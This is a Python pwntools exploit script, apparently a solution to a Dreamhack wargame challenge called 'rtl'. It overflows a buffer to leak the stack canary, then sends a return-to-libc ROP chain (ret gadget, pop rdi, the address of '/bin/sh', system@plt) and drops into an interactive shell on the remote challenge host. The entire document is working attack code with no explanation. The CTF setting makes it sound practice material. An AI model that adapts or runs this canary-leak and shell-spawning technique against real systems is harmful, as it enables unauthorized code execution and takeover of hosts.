#!/usr/bin/env python3
from pwn import *

PORT = 17656
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./rtl', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

#GDB()

p.sendafter(b"Buf: ", b'A'*(0x38+1))
p.recvuntil(b'A'*(0x38+1))
canary = u64(b'\0' + p.recv(7))
log.success("canary: " + hex(canary))

bin_sh = 0x400874
system = elf.plt.system
pop_rdi = 0x00400853
ret = 0x00400596

pl = flat(
	b'A'*0x38,
	canary,
	b'B'*8,
	ret,
	pop_rdi,
	bin_sh,
	system
	)
# input()
p.sendafter(b"Buf: ", pl)

p.interactive()